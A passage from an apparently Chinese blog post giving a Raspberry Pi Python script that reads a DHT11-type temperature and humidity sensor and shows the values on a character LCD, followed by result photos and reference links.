class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class=\"line\"><span class=\"comment\"># rewrite by ivan</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">import</span> commands,time</div><div class=\"line\"><span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tmp</span><span class=\"params\">()</span>:</span></div><div class=\"line\">  channel = <span class=\"number\">37</span></div><div class=\"line\">  data = []</div><div class=\"line\">  j = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  GPIO.setmode(GPIO.BOARD)</div><div class=\"line\"></div><div class=\"line\">  time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">  GPIO.setup(channel, GPIO.OUT)</div><div class=\"line\">  GPIO.output(channel, GPIO.LOW)</div><div class=\"line\">  time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">  GPIO.output(channel, GPIO.HIGH)</div><div class=\"line\">  GPIO.setup(channel, GPIO.IN)</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> j &lt; <span class=\"number\">40</span>:</div><div class=\"line\">    k = <span class=\"number\">0</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">      <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">      k += <span class=\"number\">1</span></div><div class=\"line\">      <span class=\"keyword\">if</span> k &gt; <span class=\"number\">100</span>:</div><div class=\"line\">        <span class=\"keyword\">break</span></div><div class=\"line\">    <span class=\"keyword\">if</span> k &lt; <span class=\"number\">8</span>:</div><div class=\"line\">      data.append(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data.append(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">    j += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span> <span class=\"string\">\"sensor is working.\"</span></div><div class=\"line\">  <span class=\"keyword\">print</span> data</div><div class=\"line\"></div><div class=\"line\">  humidity_bit = data[<span class=\"number\">0</span>:<span class=\"number\">8</span>]</div><div class=\"line\">  humidity_point_bit = data[<span class=\"number\">8</span>:<span class=\"number\">16</span>]</div><div class=\"line\">  temperature_bit = data[<span class=\"number\">16</span>:<span class=\"number\">24</span>]</div><div class=\"line\">  temperature_point_bit = data[<span class=\"number\">24</span>:<span class=\"number\">32</span>]</div><div class=\"line\">  check_bit = data[<span class=\"number\">32</span>:<span class=\"number\">40</span>]</div><div class=\"line\"></div><div class=\"line\">  humidity = <span class=\"number\">0</span></div><div class=\"line\">  humidity_point = <span class=\"number\">0</span></div><div class=\"line\">  temperature = <span class=\"number\">0</span></div><div class=\"line\">  temperature_point = <span class=\"number\">0</span></div><div class=\"line\">  check = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</div><div class=\"line\">    humidity += humidity_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    humidity_point += humidity_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature += temperature_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature_point += temperature_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    check += check_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\"></div><div class=\"line\">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> check == tmp:</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'temp:'</span> + str(temperature) + <span class=\"string\">' C \\nhumidity:'</span> + str(humidity) + <span class=\"string\">'%'</span></div><div class=\"line\">  <span class=\"keyword\">else</span>:</div><div class=\"line\">    get_tmp()</div><div class=\"line\"></div><div class=\"line\">  GPIO.cleanup()    </div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adafruit_CharLCD</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># commands</span></div><div class=\"line\">    LCD_CLEARDISPLAY            = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_RETURNHOME                  = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYMODESET            = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYCONTROL          = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORSHIFT             = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_FUNCTIONSET             = <span class=\"number\">0x20</span></div><div class=\"line\">    LCD_SETCGRAMADDR            = <span class=\"number\">0x40</span></div><div class=\"line\">    LCD_SETDDRAMADDR            = <span class=\"number\">0x80</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display entry mode</span></div><div class=\"line\">    LCD_ENTRYRIGHT              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_ENTRYLEFT               = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYSHIFTINCREMENT     = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_ENTRYSHIFTDECREMENT     = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display on/off control</span></div><div class=\"line\">    LCD_DISPLAYON               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYOFF              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_CURSORON                = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_CURSOROFF               = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_BLINKON                 = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_BLINKOFF                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_MOVERIGHT               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_MOVELEFT                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for function set</span></div><div class=\"line\">    LCD_8BITMODE                = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_4BITMODE                = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_2LINE                   = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_1LINE                   = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_5x10DOTS                = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_5x8DOTS                 = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, pin_rs=<span class=\"number\">8</span>, pin_e=<span class=\"number\">10</span>, pins_db=[<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>], GPIO = None)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class=\"line\">        <span class=\"comment\"># an explicit GPIO interface to use</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> GPIO:</div><div class=\"line\">            <span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\">        GPIO.setwarnings(<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO = GPIO</div><div class=\"line\">        self.pin_rs = pin_rs</div><div class=\"line\">        self.pin_e = pin_e</div><div class=\"line\">        self.pins_db = pins_db</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.setmode(GPIO.BOARD)</div><div class=\"line\">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class=\"line\">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.setup(pin, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x33</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x32</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x28</span>) <span class=\"comment\"># 2 line 5x7 matrix</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x0C</span>) <span class=\"comment\"># turn cursor off 0x0E to enable cursor</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x06</span>) <span class=\"comment\"># shift cursor right</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class=\"line\"></div><div class=\"line\">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class=\"line\">        self.displayfunction |= self.LCD_2LINE</div><div class=\"line\"></div><div class=\"line\">        <span class=\"string\">\"\"\" Initialize to default text direction (for romance languages) \"\"\"</span></div><div class=\"line\">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class=\"comment\">#  set the entry mode</span></div><div class=\"line\"></div><div class=\"line\">        self.clear()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span><span class=\"params\">(self, cols, lines)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (lines &gt; <span class=\"number\">1</span>):</div><div class=\"line\">                self.numlines = lines</div><div class=\"line\">                self.displayfunction |= self.LCD_2LINE</div><div class=\"line\">                self.currline = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_RETURNHOME) <span class=\"comment\"># set cursor position to zero</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>) <span class=\"comment\"># this command takes a long time!</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clear</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CLEARDISPLAY) <span class=\"comment\"># command to clear display</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>)    <span class=\"comment\"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setCursor</span><span class=\"params\">(self, col, row)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.row_offsets = [ <span class=\"number\">0x00</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x54</span> ]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> ( row &gt; self.numlines ): </div><div class=\"line\">                row = self.numlines - <span class=\"number\">1</span> <span class=\"comment\"># we count rows starting w/0</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noDisplay</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display off (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display on (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noCursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turns the underline cursor on/off \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Cursor On \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DisplayLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scrollDisplayRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leftToRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Left to Right \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rightToLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Right to Left \"\"\"</span></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">autoscroll</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'right justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noAutoscroll</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'left justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write4bits</span><span class=\"params\">(self, bits, char_mode=False)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send command to LCD \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1000</span>) <span class=\"comment\"># 1000 microsecond sleep</span></div><div class=\"line\"></div><div class=\"line\">        bits=bin(bits)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.output(self.pin_rs, char_mode)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>,<span class=\"number\">8</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i<span class=\"number\">-4</span>], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delayMicroseconds</span><span class=\"params\">(self, microseconds)</span>:</span></div><div class=\"line\">        seconds = microseconds / float(<span class=\"number\">1000000</span>) <span class=\"comment\"># divide microseconds by 1 million for seconds</span></div><div class=\"line\">        sleep(seconds)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pulseEnable</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">True</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># commands need &gt; 37us to settle</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span><span class=\"params\">(self, text)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send string to LCD. Newline wraps to second line\"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</div><div class=\"line\">            <span class=\"keyword\">if</span> char == <span class=\"string\">'\\n'</span>:</div><div class=\"line\">                self.write4bits(<span class=\"number\">0xC0</span>) <span class=\"comment\"># next line</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                self.write4bits(ord(char),<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        tmp = get_tmp() </div><div class=\"line\">        <span class=\"keyword\">if</span> tmp:</div><div class=\"line\">            lcd = Adafruit_CharLCD()</div><div class=\"line\">            lcd.noBlink()</div><div class=\"line\">            lcd.clear()</div><div class=\"line\">            lcd.message(tmp)</div><div class=\"line\">        sleep(<span class=\"number\">5</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/content/images/2016/08/WechatIMG302.jpeg\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/08/WechatIMG293.jpeg\" alt=\"\"></p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://gist.github.com/hugozhu/6166527\">https://gist.github.com/hugozhu/6166527</a><br><a href=\"https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href=\"https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href=\"http://blog.csdn.net/xukai871105/article/details/12684617\">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href=\"https://www.oschina.net/question/1425530\\_140979\">https://www.oschina.net/question/1425530\\_140979</a><br><a 